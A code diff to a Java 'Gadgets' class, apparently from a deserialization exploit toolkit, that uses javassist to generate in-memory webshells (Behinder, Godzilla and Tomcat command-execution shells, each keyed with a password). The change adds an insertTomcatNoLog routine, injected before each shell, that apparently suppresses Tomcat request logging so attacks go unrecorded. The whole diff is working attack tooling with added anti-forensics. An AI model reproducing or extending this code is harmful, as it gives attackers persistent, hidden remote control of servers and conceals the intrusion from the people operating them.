@@ -395,6 +395,7 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 
 				if (isTomcat) {
+					insertTomcatNoLog(ctClass);
 					insertMethod(ctClass, method, base64Decode(BEHINDER_SHELL_FOR_TOMCAT)
 							.replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
 				} else {
@@ -411,7 +412,7 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
 				ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
 				ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
-
+				insertTomcatNoLog(ctClass);
 				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
 				break;
 			// 哥斯拉 raw 类型的内存马
@@ -420,7 +421,7 @@ public class Gadgets {
 				insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
 
 				ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
-
+				insertTomcatNoLog(ctClass);
 				insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://su18.org/", REFERER));
 				break;
 			// Tomcat Executor cmd 执行内存马
@@ -449,6 +450,7 @@ public class Gadgets {
 				insertCMD(ctClass);
 
 				if (isTomcat) {
+					insertTomcatNoLog(ctClass);
 					insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://su18.org/", REFERER));
 				} else {
 					insertMethod(ctClass, method, base64Decode(CMD_SHELL).replace("https://su18.org/", REFERER));
@@ -501,5 +503,28 @@ public class Gadgets {
 		} catch (javassist.NotFoundException ignored) {
 		}
 		ctClass.addField(CtField.make(fieldCode, ctClass));
+	}
+
+	public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
+
+		try {
+			ctClass.getDeclaredMethod("getFieldValue");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+		}
+
+		try {
+			ctClass.getDeclaredMethod("getMethodByClass");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
+		}
+
+		try {
+			ctClass.getDeclaredMethod("getMethodAndInvoke");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+		}
+
+		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
 	}
 }
